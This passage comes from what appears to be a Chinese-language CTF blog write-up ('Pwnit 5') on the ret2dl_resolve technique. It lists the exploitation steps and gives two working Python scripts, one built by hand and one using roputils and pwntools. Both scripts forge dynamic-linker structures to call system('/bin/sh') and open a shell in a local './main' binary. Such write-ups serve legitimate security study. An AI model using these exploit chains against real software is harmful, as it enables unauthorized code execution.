<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="n">r_info</span><span class="p">])</span>

<span class="c1"># 5. fake st_name 
# 0x10 is the offset of fake_write_sym
</span><span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
<span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>


<span class="c1"># args in dl_reslove
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1"># fake ret of write
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="c1"># write(1, addr, len)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'aaaa'</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'bbbb'</span><span class="p">)</span>
<span class="c1"># 1. fake .rel.plt (offset 4*6=24)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>
<span class="c1"># padding
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'a'</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>
<span class="c1"># 2. fake .dynsym (align to 0x10)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>
<span class="c1"># 3. fake .dynstr
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'system</span><span class="se">\x00\x00</span><span class="s">'</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="k">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="images/Snipaste_2019-03-06_19-11-34.png" alt="Snipaste_2019-03-06_19-11-34" /></p>

<h2 id="漏洞利用方式">漏洞利用方式</h2>

<ol>
  <li>控制<code class="highlighter-rouge">eip</code>为PLT[0]的地址，只需传递一个<code class="highlighter-rouge">index_arg</code>参数</li>
  <li>控制<code class="highlighter-rouge">index_arg</code>的大小，使<code class="highlighter-rouge">reloc</code>的位置落在可控地址内</li>
  <li>伪造<code class="highlighter-rouge">reloc</code>的内容，使<code class="highlighter-rouge">sym</code>落在可控地址内</li>
  <li>伪造<code class="highlighter-rouge">sym</code>的内容，使<code class="highlighter-rouge">name</code>落在可控地址内</li>
  <li>伪造<code class="highlighter-rouge">name</code>为任意库函数，如<code class="highlighter-rouge">system</code></li>
</ol>

<h2 id="工具攻击">工具攻击</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# -*- coding: utf-8 -*-
</span><span class="n">__author__</span> <span class="o">=</span> <span class="s">'zjgcjy'</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">'/home/zjgcjy/roputils'</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span><span class="p">,</span> <span class="n">gdb</span><span class="p">,</span> <span class="n">context</span>

<span class="c1">#from LibcSearcher import *
#context.arch = elf.arch
</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">,</span> <span class="s">'sh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./main'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s">'./main'</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_base</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">section</span><span class="p">(</span><span class="s">'.bss'</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s">'read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">## used to call dl_Resolve()
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="c1">## used to make faking data, such relocation, Symbol, Str
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="s">'system'</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#pwn" class="page__taxonomy-item" rel="tag">pwn</a>
    
    </span>
  </p>




        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-03T13:20:00+08:00">March 03, 2019</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+5%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-5.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-5.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-5.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/posts/2019-03/Pwnit-4.html" class="pagination--pager" title="Pwnit 4
">Previous</a>
    
    
      <a href="/posts/2019-03/ELF-structure.html" class="pagination--pager" title="Elf Structure
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-11/Dirary_November.html" rel="permalink">Dirary_november
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  每日所作所得




11月1日
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/Software_Security_Project.html" rel="permalink">Software_security_project
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  Malware
vs2010




InfoCollection

configure



warning



</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/Pacman_Helper.html" rel="permalink">Pacman_helper
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  pacman 手册




archlinux pacman 命令
arch wiki

pacman -Sy 仅同步源

pacman -Syu 同步源，并更新系统

pacman -Su –ignore foo 升级时不升级包foo

pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/%E5%8D%81%E6%9C%88%E6%97%A5%E8%AE%B0.html" rel="permalink">十月日记
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  每日所作所得




10月1日

周日，上课前最后一天，算是给自己放了最后一天假期

10月2日

上了第一天的课，主要是os，一脸蒙蔽。
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2019 Blogger. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://localhost:4000/posts/2019-03/Pwnit-5.html";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/posts/2019-03/Pwnit-5"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://zjgcjy-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
